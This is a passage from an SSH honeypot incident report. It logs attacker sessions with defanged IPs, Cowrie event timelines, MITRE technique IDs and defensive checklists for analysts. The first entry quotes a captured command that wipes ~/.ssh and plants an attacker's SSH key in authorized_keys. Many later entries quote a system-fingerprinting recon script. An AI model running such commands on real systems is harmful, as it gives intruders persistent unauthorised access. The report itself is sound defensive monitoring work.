| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:28` | `cowrie.session.connect` |
| `2026-08-29 12:13:28` | `cowrie.client.version` |
| `2026-08-29 12:13:28` | `cowrie.client.kex` |
| `2026-08-29 12:13:29` | `cowrie.login.success` |
| `2026-08-29 12:13:30` | `cowrie.session.params` |
| `2026-08-29 12:13:30` | `cowrie.command.input` |
| `2026-08-29 12:13:30` | `cowrie.command.failed` |
| `2026-08-29 12:13:31` | `cowrie.log.closed` |
| `2026-08-29 12:13:32` | `cowrie.session.params` |
| `2026-08-29 12:13:32` | `cowrie.command.input` |
| `2026-08-29 12:13:32` | `cowrie.session.file_download` |
| `2026-08-29 12:13:32` | `cowrie.log.closed` |
| `2026-08-29 12:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-539340935e43

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:32` | `cowrie.session.connect` |
| `2026-08-29 12:13:32` | `cowrie.client.version` |
| `2026-08-29 12:13:33` | `cowrie.client.kex` |
| `2026-08-29 12:13:34` | `cowrie.login.success` |
| `2026-08-29 12:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c1f23c4711

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:34` | `cowrie.session.connect` |
| `2026-08-29 12:13:34` | `cowrie.client.version` |
| `2026-08-29 12:13:35` | `cowrie.client.kex` |
| `2026-08-29 12:13:36` | `cowrie.login.success` |
| `2026-08-29 12:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-587e98c2fbe9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:13 |
| **Last Seen** | 2026-08-29 12:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:13:36` | `cowrie.session.connect` |
| `2026-08-29 12:13:36` | `cowrie.client.version` |
| `2026-08-29 12:13:36` | `cowrie.client.kex` |
| `2026-08-29 12:13:37` | `cowrie.login.success` |
| `2026-08-29 12:13:37` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:13:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:13:37` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2bae42d11d9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:15 |
| **Last Seen** | 2026-08-29 12:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:15:00` | `cowrie.session.connect` |
| `2026-08-29 12:15:00` | `cowrie.client.version` |
| `2026-08-29 12:15:00` | `cowrie.client.kex` |
| `2026-08-29 12:15:02` | `cowrie.login.success` |
| `2026-08-29 12:15:03` | `cowrie.session.params` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.success` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:03` | `cowrie.command.input` |
| `2026-08-29 12:15:04` | `cowrie.log.closed` |
| `2026-08-29 12:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cecb8e07c8c4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:16 |
| **Last Seen** | 2026-08-29 12:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:16:47` | `cowrie.session.connect` |
| `2026-08-29 12:16:48` | `cowrie.client.version` |
| `2026-08-29 12:16:48` | `cowrie.client.kex` |
| `2026-08-29 12:16:49` | `cowrie.login.success` |
| `2026-08-29 12:16:51` | `cowrie.session.params` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.success` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.command.input` |
| `2026-08-29 12:16:51` | `cowrie.log.closed` |
| `2026-08-29 12:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-337c947798b9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:18 |
| **Last Seen** | 2026-08-29 12:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:18:32` | `cowrie.session.connect` |
| `2026-08-29 12:18:32` | `cowrie.client.version` |
| `2026-08-29 12:18:32` | `cowrie.client.kex` |
| `2026-08-29 12:18:34` | `cowrie.login.success` |
| `2026-08-29 12:18:35` | `cowrie.session.params` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.success` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.command.input` |
| `2026-08-29 12:18:35` | `cowrie.log.closed` |
| `2026-08-29 12:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-879c1164a364

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:20 |
| **Last Seen** | 2026-08-29 12:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:20:19` | `cowrie.session.connect` |
| `2026-08-29 12:20:19` | `cowrie.client.version` |
| `2026-08-29 12:20:19` | `cowrie.client.kex` |
| `2026-08-29 12:20:21` | `cowrie.login.success` |
| `2026-08-29 12:20:22` | `cowrie.session.params` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.success` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.command.input` |
| `2026-08-29 12:20:22` | `cowrie.log.closed` |
| `2026-08-29 12:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b31a9fa5b3

| Field | Detail |
|---|---|
| **Source IP** | `23.30.11[.]253` |
| **First Seen** | 2026-08-29 12:21 |
| **Last Seen** | 2026-08-29 12:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:21:41` | `cowrie.session.connect` |
| `2026-08-29 12:21:42` | `cowrie.client.version` |
| `2026-08-29 12:21:42` | `cowrie.client.kex` |
| `2026-08-29 12:21:43` | `cowrie.login.success` |
| `2026-08-29 12:21:43` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:21:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.30.11[.]253` to AbuseIPDB if not already reported
- [ ] Block `23.30.11[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8493430a81df

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-08-29 12:21 |
| **Last Seen** | 2026-08-29 12:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:21:48` | `cowrie.session.connect` |
| `2026-08-29 12:21:49` | `cowrie.client.version` |
| `2026-08-29 12:21:49` | `cowrie.client.kex` |
| `2026-08-29 12:21:50` | `cowrie.login.success` |
| `2026-08-29 12:21:51` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9ac1951a3c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:22 |
| **Last Seen** | 2026-08-29 12:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:22:01` | `cowrie.session.connect` |
| `2026-08-29 12:22:01` | `cowrie.client.version` |
| `2026-08-29 12:22:02` | `cowrie.client.kex` |
| `2026-08-29 12:22:03` | `cowrie.login.success` |
| `2026-08-29 12:22:05` | `cowrie.session.params` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.success` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.command.input` |
| `2026-08-29 12:22:05` | `cowrie.log.closed` |
| `2026-08-29 12:22:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-771a0ef5454c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:23 |
| **Last Seen** | 2026-08-29 12:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:23:36` | `cowrie.session.connect` |
| `2026-08-29 12:23:36` | `cowrie.client.version` |
| `2026-08-29 12:23:36` | `cowrie.client.kex` |
| `2026-08-29 12:23:38` | `cowrie.login.success` |
| `2026-08-29 12:23:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:23:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:23:39` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0912983b41

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 12:23 |
| **Last Seen** | 2026-08-29 12:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:23:37` | `cowrie.session.connect` |
| `2026-08-29 12:23:37` | `cowrie.client.version` |
| `2026-08-29 12:23:37` | `cowrie.client.kex` |
| `2026-08-29 12:23:38` | `cowrie.login.success` |
| `2026-08-29 12:23:38` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:23:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 12:23:40` | `cowrie.direct-tcpip.data` |
| `2026-08-29 12:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7996e23344e8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:23 |
| **Last Seen** | 2026-08-29 12:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:23:43` | `cowrie.session.connect` |
| `2026-08-29 12:23:43` | `cowrie.client.version` |
| `2026-08-29 12:23:43` | `cowrie.client.kex` |
| `2026-08-29 12:23:45` | `cowrie.login.success` |
| `2026-08-29 12:23:47` | `cowrie.session.params` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.success` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.command.input` |
| `2026-08-29 12:23:47` | `cowrie.log.closed` |
| `2026-08-29 12:23:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df332e297d0d

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-08-29 12:25 |
| **Last Seen** | 2026-08-29 12:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:25:01` | `cowrie.session.connect` |
| `2026-08-29 12:25:01` | `cowrie.client.version` |
| `2026-08-29 12:25:01` | `cowrie.client.kex` |
| `2026-08-29 12:25:02` | `cowrie.login.success` |
| `2026-08-29 12:25:03` | `cowrie.direct-tcpip.request` |
| `2026-08-29 12:25:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81be56b51283

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:25 |
| **Last Seen** | 2026-08-29 12:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 12:25:27` | `cowrie.session.connect` |
| `2026-08-29 12:25:27` | `cowrie.client.version` |
| `2026-08-29 12:25:27` | `cowrie.client.kex` |
| `2026-08-29 12:25:29` | `cowrie.login.success` |
| `2026-08-29 12:25:30` | `cowrie.session.params` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.success` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.command.input` |
| `2026-08-29 12:25:30` | `cowrie.log.closed` |
| `2026-08-29 12:25:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dea36f90bd7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-29 12:27 |
| **Last Seen** | 2026-08-29 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
